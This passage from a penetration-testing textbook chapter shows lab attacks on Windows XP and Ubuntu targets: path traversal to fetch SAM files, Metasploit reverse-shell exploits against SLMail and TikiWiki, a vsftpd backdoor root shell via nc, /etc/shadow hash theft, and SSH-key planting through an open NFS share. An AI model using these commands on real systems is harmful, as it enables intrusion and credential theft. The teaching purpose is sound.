following URL:</p><a id="pro_id00120"/><pre class="programlisting">http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/system32/config/sam</pre><p>When we try to use Zervit to download this file, we get a “file not found” error. It looks like our Zervit server doesn’t have access to this file. Luckily, Windows XP backs up both the SAM and SYSTEM files to the <span class="emphasis"><em>C:\Windows\repair directory</em></span>, and if we try to pull down the files from there, Zervit is able to serve them. These URLs should do the trick:</p><a id="pro_id00121"/><pre class="programlisting">http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/system&#13;
http://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/sam</pre><div class="note" title="Note"><h3 class="title"><a id="ch08note05"/>Note</h3><p>Like our MD5 hashes, we’ll use the Windows SAM file in the next chapter when we cover password attacks in depth.</p></div></div></div><div class="sect1" title="Exploiting a Buffer Overflow in Third-Party Software"><div class="titlepage"><div><div><h2 class="title" id="exploiting_a_buffer_overflow_in_third-pa" style="clear: both">Exploiting a Buffer Overflow in Third-Party Software</h2></div></div></div><p><a class="indexterm" id="iddle1143"/><a class="indexterm" id="iddle1364"/><a class="indexterm" id="iddle2157"/><a class="indexterm" id="iddle2303"/>In <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a>, we never did find out for sure if the SLMail server on our Windows XP target is vulnerable to the POP3 issue CVE-2003-0264. The version number reported by SLMail (5.5) appears to line up with the vulnerability, so let’s try exploiting it. The corresponding Metasploit module, <span class="emphasis"><em>windows/pop3/seattlelab_pass</em></span>, has a rank of <span class="emphasis"><em>great</em></span>. (A ranking that high is unlikely to crash the service if it fails.)</p><p><span class="emphasis"><em>Windows/pop3/seattlelab_pass</em></span> attempts to exploit a buffer overflow in the POP3 server. Using it is similar to setting up the MS08-067 exploit, as shown in <a class="xref" href="ch08.xhtml#exploiting_slmail_5dot5_pop3_with_metasp" title="Example 8-5. Exploiting SLMail 5.5 POP3 with Metasploit">Example 8-5</a>.</p><div class="example"><a id="exploiting_slmail_5dot5_pop3_with_metasp"/><div class="example-title">Example 8-5. Exploiting SLMail 5.5 POP3 with Metasploit</div><div class="example-contents"><pre class="programlisting">msf &gt; <span class="strong"><strong>use windows/pop3/seattlelab_pass</strong></span>&#13;
msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>show payloads</strong></span>&#13;
&#13;
Compatible Payloads&#13;
===================&#13;
&#13;
   Name                                         Disclosure Date  Rank    Description&#13;
   ----                                         ---------------  ----    -----------&#13;
   generic/custom                                                normal  Custom Payload&#13;
   generic/debug_trap                                            normal  Generic x86 Debug Trap&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
&#13;
msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>set PAYLOAD windows/meterpreter/reverse_tcp</strong></span>&#13;
PAYLOAD =&gt; windows/meterpreter/reverse_tcp&#13;
msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/windows/pop3/seattlelab_pass):&#13;
&#13;
   Name   Current Setting  Required  Description&#13;
   ----   ---------------  --------  -----------&#13;
   RHOST  192.168.20.10    yes       The target address&#13;
   RPORT  110              yes       The target port&#13;
&#13;
&#13;
Payload options (windows/meterpreter/reverse_tcp):&#13;
&#13;
   Name      Current Setting  Required  Description&#13;
   ----      ---------------  --------  -----------&#13;
   EXITFUNC  thread           yes       Exit technique: seh, thread, process, none&#13;
   LHOST                      yes       The listen address&#13;
   LPORT     4444             yes       The listen port&#13;
&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
   0   Windows NT/2000/XP/2003 (SLMail 5.5)&#13;
&#13;
msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>set RHOST 192.168.20.10</strong></span>&#13;
RHOST =&gt; 192.168.20.10&#13;
msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>&#13;
LHOST =&gt; 192.168.20.9&#13;
msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Trying Windows NT/2000/XP/2003 (SLMail 5.5) using jmp esp at 5f4a358f&#13;
[*] Sending stage (752128 bytes) to 192.168.20.10&#13;
[*] Meterpreter session 4 opened (192.168.20.9:4444 -&gt; 192.168.20.10:1566) at 2015-01-07 19:57:22 -0500&#13;
&#13;
meterpreter &gt;</pre></div></div><p><a class="indexterm" id="iddle1375"/><a class="indexterm" id="iddle2304"/><a class="indexterm" id="iddle2307"/><a class="indexterm" id="iddle2440"/>Running this exploit should give us another Meterpreter session on the Windows XP target—yet another way to take control of the system. (In <a class="xref" href="ch13.xhtml" title="Chapter 13. Post Exploitation">Chapter 13</a>, which covers post exploitation, we’ll see what to do once we have a Meterpreter session on a target.)</p></div><div class="sect1" title="Exploiting Third-Party Web Applications"><div class="titlepage"><div><div><h2 class="title" id="exploiting_third-party_web_applications" style="clear: both">Exploiting Third-Party Web Applications</h2></div></div></div><p>In <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a>, we used the Nikto web scanner against our Linux target and discovered an installation of the TikiWiki CMS software version 1.9.8 with a code execution vulnerability in the script <span class="emphasis"><em>graph_formula.php</em></span>. A search for <span class="emphasis"><em>TikiWiki</em></span> in Metasploit returns several modules, as shown in <a class="xref" href="ch08.xhtml#tikiwiki_exploit_information" title="Example 8-6. TikiWiki exploit information">Example 8-6</a>.</p><div class="example"><a id="tikiwiki_exploit_information"/><div class="example-title">Example 8-6. TikiWiki exploit information</div><div class="example-contents"><pre class="programlisting">msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>search tikiwiki</strong></span>&#13;
&#13;
Matching Modules&#13;
================&#13;
&#13;
   Name                                            Disclosure Date         Rank      Description&#13;
   ----                                            ---------------         ----      -----------&#13;
   --<span class="emphasis"><em>snip</em></span>--&#13;
  ❶exploit/unix/webapp/tikiwiki_graph_formula_exec 2007-10-10 00:00:00 UTC excellent TikiWiki graph_&#13;
                                                                                       formula Remote&#13;
                                                                                       PHP Code&#13;
                                                                                       Execution&#13;
   exploit/unix/webapp/tikiwiki_jhot_exec          2006-09-02 00:00:00 UTC excellent TikiWiki jhot&#13;
                                                                                       Remote Command&#13;
                                                                                       Execution&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
&#13;
msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>info unix/webapp/tikiwiki_graph_formula_exec</strong></span>&#13;
&#13;
       Name: TikiWiki tiki-graph_formula Remote PHP Code Execution&#13;
     Module: exploit/unix/webapp/tikiwiki_graph_formula_exec&#13;
  --<span class="emphasis"><em>snip</em></span>--&#13;
  TikiWiki (&lt;= 1.9.8) contains a flaw that may allow a remote attacker&#13;
  to execute arbitrary PHP code. The issue is due to&#13;
  'tiki-graph_formula.php' script not properly sanitizing user input&#13;
  supplied to create_function(), which may allow a remote attacker to&#13;
  execute arbitrary PHP code resulting in a loss of integrity.&#13;
&#13;
References:&#13;
  http://cve.mitre.org/cgi-bin/cvename.cgi?name=2007-5423&#13;
  http://www.osvdb.org/40478❷&#13;
  http://www.securityfocus.com/bid/26006</pre></div></div><p>Based on the module names, <span class="emphasis"><em>unix/webapp/tikiwiki_graph_formula_exec</em></span> ❶ looks like the one we need because it has <span class="emphasis"><em>graph_formula</em></span> in its name. Our assumption is confirmed when we run <code class="literal">info</code> on the module. The OSVDB number ❷ listed in the references for <span class="emphasis"><em>unix/webapp/tikiwiki_graph_formula_exec</em></span> matches our Nikto output from <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a>.</p><p>The options for this module are different from our previous exploit examples, as shown in <a class="xref" href="ch08.xhtml#using_the_tikiwiki_exploit" title="Example 8-7. Using the TikiWiki exploit">Example 8-7</a>.</p><div class="example"><a id="using_the_tikiwiki_exploit"/><div class="example-title">Example 8-7. Using the TikiWiki exploit</div><div class="example-contents"><pre class="programlisting">msf  exploit(seattlelab_pass) &gt; <span class="strong"><strong>use unix/webapp/tikiwiki_graph_formula_exec</strong></span>&#13;
msf  exploit(tikiwiki_graph_formula_exec) &gt; <span class="strong"><strong>show options</strong></span>&#13;
&#13;
Module options (exploit/unix/webapp/tikiwiki_graph_formula_exec):&#13;
&#13;
   Name     Current Setting  Required  Description&#13;
   ----     ---------------  --------  -----------&#13;
   Proxies                   no        Use a proxy chain❶&#13;
   RHOST                     yes       The target address&#13;
   RPORT    80               yes       The target port&#13;
   URI      /tikiwiki        yes       TikiWiki directory path❷&#13;
   VHOST                     no        HTTP server virtual host❸&#13;
&#13;
&#13;
Exploit target:&#13;
&#13;
   Id  Name&#13;
   --  ----&#13;
   0   Automatic&#13;
&#13;
&#13;
msf  exploit(tikiwiki_graph_formula_exec) &gt; <span class="strong"><strong>set RHOST 192.168.20.11</strong></span>&#13;
RHOST =&gt; 192.168.20.11</pre></div></div><p>We could set a proxy chain ❶ and/or a virtual host ❸ for the TikiWiki server, but we don’t need to here. We can leave the URI set to the default location <span class="emphasis"><em>/tikiwiki</em></span> ❷.</p><p>This exploit involves PHP command execution, so naturally, our payloads are PHP based. Using the <code class="literal">show payloads</code> command (<a class="xref" href="ch08.xhtml#exploiting_tikiwiki_with_metasploit" title="Example 8-8. Exploiting TikiWiki with Metasploit">Example 8-8</a>) reveals that we can use PHP-based Meterpreter ❶ as we did in our XAMPP exploit. We will also need to set our <code class="literal">LHOST</code> option ❷ again.</p><div class="example"><a id="exploiting_tikiwiki_with_metasploit"/><div class="example-title">Example 8-8. Exploiting TikiWiki with Metasploit</div><div class="example-contents"><pre class="programlisting">msf  exploit(tikiwiki_graph_formula_exec) &gt; <span class="strong"><strong>set payload</strong></span> <span class="strong"><strong>php/meterpreter/reverse_tcp</strong></span>❶&#13;
payload =&gt; php/meterpreter/reverse_tcp&#13;
&#13;
msf  exploit(tikiwiki_graph_formula_exec) &gt; <span class="strong"><strong>set LHOST 192.168.20.9</strong></span>❷&#13;
LHOST =&gt; 192.168.20.110&#13;
msf  exploit(tikiwiki_graph_formula_exec) &gt; <span class="strong"><strong>exploit</strong></span>&#13;
&#13;
[*] Started reverse handler on 192.168.20.9:4444&#13;
[*] Attempting to obtain database credentials...&#13;
[*] The server returned            : 200 OK&#13;
[*] Server version                 : Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch&#13;
[*] TikiWiki database informations :&#13;
&#13;
db_tiki   : mysql&#13;
dbversion : 1.9&#13;
host_tiki : localhost&#13;
user_tiki : tiki❸&#13;
pass_tiki : tikipassword&#13;
dbs_tiki  : tikiwiki&#13;
&#13;
[*] Attempting to execute our payload...&#13;
[*] Sending stage (39217 bytes) to 192.168.20.11&#13;
[*] Meterpreter session 5 opened (192.168.20.9:4444 -&gt; 192.168.20.11:54324) at 2015-01-07 20:41:53 -0500&#13;
&#13;
meterpreter &gt;</pre></div></div><p><a class="indexterm" id="iddle1091"/><a class="indexterm" id="iddle1197"/><a class="indexterm" id="iddle1366"/><a class="indexterm" id="iddle2366"/><a class="indexterm" id="iddle2403"/>As you can see, while exploiting the TikiWiki installation, the Metasploit module discovered the credentials ❸ for the TikiWiki database. Unfortunately, the MySQL server is not listening on the network, so these credentials cannot be used for additional compromise. Still, we should note them because they might come in handy during post exploitation.</p></div><div class="sect1" title="Exploiting a Compromised Service"><div class="titlepage"><div><div><h2 class="title" id="exploiting_a_compromised_service" style="clear: both">Exploiting a Compromised Service</h2></div></div></div><p>We noted in <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a> that the FTP server on the Linux target serves a banner for Very Secure FTP 2.3.4, the version replaced with a binary containing a backdoor. Because the official code was eventually restored by the authors of Vsftpd, the only way to find out if the server on our Linux target has the backdoor code is to test it. (We don’t need to worry about potentially crashing the service if it’s not vulnerable: If this server doesn’t have the backdoor code, we’ll just get a login error when we use the smiley face.)</p><p>Enter any username you like, and add a <code class="literal">:)</code> at the end (see <a class="xref" href="ch08.xhtml#triggering_the_vsftpd_backdoor" title="Example 8-9. Triggering the Vsftpd backdoor">Example 8-9</a>). Use anything for the password, as well. If the backdoor is present, it will trigger without valid credentials.</p><div class="example"><a id="triggering_the_vsftpd_backdoor"/><div class="example-title">Example 8-9. Triggering the Vsftpd backdoor</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>ftp 192.168.20.11</strong></span>&#13;
Connected to 192.168.20.11.&#13;
220 (vsFTPd 2.3.4)&#13;
Name (192.168.20.11:root): georgia:)&#13;
331 Please specify the password.&#13;
Password:</pre></div></div><p><a class="indexterm" id="iddle1169"/><a class="indexterm" id="iddle1370"/><a class="indexterm" id="iddle1827"/><a class="indexterm" id="iddle1833"/><a class="indexterm" id="iddle1906"/><a class="indexterm" id="iddle1989"/><a class="indexterm" id="iddle2014"/><a class="indexterm" id="iddle2084"/><a class="indexterm" id="iddle2216"/><a class="indexterm" id="iddle2276"/>We notice that the login hangs after the password. This tells us that the FTP server is still processing our login attempt, and if we query the FTP port again, it will continue to respond. Let’s use Netcat to try connecting to port 6200, where the root shell should spawn if the backdoor is present.</p><a id="pro_id00122"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc 192.168.20.11 6200</strong></span>&#13;
# <span class="strong"><strong>whoami</strong></span>&#13;
root</pre><p>Sure enough, we have a root shell. Root privileges give us total control of our target machine. For example, we can get the system password hashes with the command <code class="literal">cat /etc/shadow</code>. Save the password hash for the user <span class="emphasis"><em>georgia</em></span> (<span class="emphasis"><em>georgia:$1$CNp3mty6$|RWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::</em></span>)to a file called <span class="emphasis"><em>linuxpasswords.txt</em></span>. We will attempt to turn this hash into a plaintext password in <a class="xref" href="ch09.xhtml" title="Chapter 9. Password Attacks">Chapter 9</a>.</p></div><div class="sect1" title="Exploiting Open NFS Shares"><div class="titlepage"><div><div><h2 class="title" id="exploiting_open_nfs_shares" style="clear: both">Exploiting Open NFS Shares</h2></div></div></div><p>At this point we know that the Linux target has exported user <span class="emphasis"><em>georgia</em></span>’s home folder using NFS and that that share is available to anyone without the need for credentials. But this might not carry much security risk if we cannot use the access to read or write sensitive files.</p><p>Recall that when we scanned the NFS mount in <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a>, we saw the <span class="emphasis"><em>.ssh</em></span> directory. This directory could contain the user’s private SSH keys as well as keys used for authenticating a user over SSH. Let’s see if we can exploit this share. Start by mounting the NFS share on your Kali system.</p><a id="pro_id00123"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>mkdir /tmp/mount</strong></span>&#13;
root@kali:~# <span class="strong"><strong>mount -t nfs -o nolock 192.168.20.11:/export/georgia /tmp/mount</strong></span></pre><p>This doesn’t look too promising at first glance because <span class="emphasis"><em>georgia</em></span> has no documents, pictures, or videos—just some simple buffer overflow examples we will use in <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a>. There doesn’t appear to be any sensitive information here, but before we jump to conclusions, let’s see what’s in the <span class="emphasis"><em>.ssh</em></span> directory.</p><a id="pro_id00124"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>cd /tmp/mount/.ssh</strong></span>&#13;
root@kali:/tmp/mount/.ssh# <span class="strong"><strong>ls</strong></span>&#13;
authorized_keys  id_rsa  id_rsa.pub</pre><p>We now have access to <span class="emphasis"><em>georgia</em></span>’s SSH keys. The <span class="emphasis"><em>id_rsa</em></span> file is her private key, and <span class="emphasis"><em>id_rsa.pub</em></span> is her corresponding public key. We can read or even change these values, and we can write to the SSH file <span class="emphasis"><em>authorized_keys</em></span>, which <a class="indexterm" id="iddle2219"/><a class="indexterm" id="iddle2220"/><a class="indexterm" id="iddle2221"/>handles a list of SSH public keys that are authorized to log in as the user <span class="emphasis"><em>georgia</em></span>. And because we have write privileges, we can add our own key here that will allow us to bypass password authentication when logging in to the Ubuntu target as <span class="emphasis"><em>georgia</em></span>, as shown in <a class="xref" href="ch08.xhtml#generating_a_new_ssh_key_pair" title="Example 8-10. Generating a new SSH key pair">Example 8-10</a>.</p><div class="example"><a id="generating_a_new_ssh_key_pair"/><div class="example-title">Example 8-10. Generating a new SSH key pair</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>ssh-keygen</strong></span>&#13;
Generating public/private rsa key pair.&#13;
Enter file in which to save the key (/root/.ssh/id_rsa):&#13;
Enter passphrase (empty for no passphrase):&#13;
Enter same passphrase again:&#13;
Your identification has been saved in /root/.ssh/id_rsa.&#13;
Your public key has been saved in /root/.ssh/id_rsa.pub.&#13;
The key fingerprint is:&#13;
26:c9:b7:94:8e:3e:d5:04:83:48:91:d9:80:ec:3f:39 root@kali&#13;
The key's randomart image is:&#13;
+--[ RSA 2048]----+&#13;
| . o+B .         |&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
+-----------------+</pre></div></div><p>First, we generate a key on our Kali machine using <code class="literal">ssh-keygen</code>. By default our new public key is written to <span class="emphasis"><em>/root/.ssh/id_rsa.pub</em></span>, and our private key is written to <span class="emphasis"><em>/root/.ssh/id_rsa</em></span>. We want to add our public key to the <span class="emphasis"><em>authorized_keys</em></span> file for <span class="emphasis"><em>georgia</em></span> on Ubuntu.</p><p>Next, let’s append the newly generated public key to <span class="emphasis"><em>georgia</em></span>’s <span class="emphasis"><em>authorized_keys</em></span> file. <code class="literal">cat</code> out the contents of the <span class="emphasis"><em>/root/.ssh/id_rsa.pub</em></span> file, and append it to <span class="emphasis"><em>georgia</em></span>’s <span class="emphasis"><em>authorized_keys</em></span> file.</p><a id="pro_id00125"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>cat ~/.ssh/id_rsa.pub &gt;&gt; /tmp/mount/.ssh/authorized_keys</strong></span></pre><p>We should now be able to SSH into the Linux target as <span class="emphasis"><em>georgia</em></span>. Let’s give it a try.</p><a id="pro_id00126"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>ssh georgia@192.168.20.11</strong></span>&#13;
georgia@ubuntu:~$</pre><p>That worked nicely. We can now successfully authenticate with the Linux target using public key authentication.</p><p>We could also have gained access by copying <span class="emphasis"><em>georgia</em></span>’s key to the Kali machine. To do so, we first delete the SSH identity we created.</p><a id="pro_id00127"/><pre class="programlisting">root@kali:/tmp/mount/.ssh# <span class="strong"><strong>rm ~/.ssh/id_rsa.pub</strong></span>&#13;
root@kali:/tmp/mount/.ssh# <span class="strong"><strong>rm ~/.ssh/id_rsa</strong></span></pre><p>Now, we copy <span class="emphasis"><em>georgia</em></span>’s private key (<span class="emphasis"><em>id_rsa</em></span>) and public key (<span class="emphasis"><em>id_rsa.pub</em></span>) to root’s <span class="emphasis"><em>.ssh</em></span> directory on Kali, and use the <code class="literal">ssh-add</code> command to add the identity to the authentication agent before we try to SSH into the Linux target.</p><a id="pro_id00128"/><pre class="programlisting">root@kali:/tmp/mount/.ssh# <span class="strong"><strong>cp id_rsa.pub ~/.ssh/id_rsa.pub</strong></span>&#13;
root@kali:/tmp/mount/.ssh# <span class="strong"><strong>cp id_rsa ~/.ssh/id_rsa</strong></span>&#13;
root@kali:/tmp/mount/.ssh# <span class="strong"><strong>ssh-add</strong></span>&#13;
Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)&#13;
root@kali:/tmp/mount/.ssh# <span class="strong"><strong>ssh georgia@192.168.20.11</strong></span>&#13;
Linux ubuntu 2.6.27-7-generic #1 SMP Fri Oct 24 06:42:44 UTC 2008 i686&#13;
georgia@ubuntu:~$</pre><p>Again, we are able to gain access to the target by manipulating the SSH keys. We started with the ability to read and write files in <span class="emphasis"><em>georgia</em></span>’s home directory. Now we have a shell on the Linux system as user <span class="emphasis"><em>georgia</em></span> without needing a password.</p></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00025" style="clear: both">Summary</h2></div></div></div><p>In this chapter we were able to combine the information we gathered in <a class="xref" href="ch05.xhtml" title="Chapter 5. Information Gathering">Chapter 5</a> with the vulnerabilities discovered in <a class="xref" href="ch06.xhtml" title="Chapter 6. Finding Vulnerabilities">Chapter 6</a> to exploit multiple compromises on both the Windows XP and Linux targets. We used various techniques, including attacking misconfigured web servers, piggybacking on backdoored software, taking advantage of poor access control to sensitive files, exploiting vulnerabilities in the underlying system, and exploiting issues in third-party software.</p><p>Now that we’ve managed to get a foothold in the systems, in the next chapter, let’s turn to cracking the passwords we found on the systems.</p></div></section></body></html>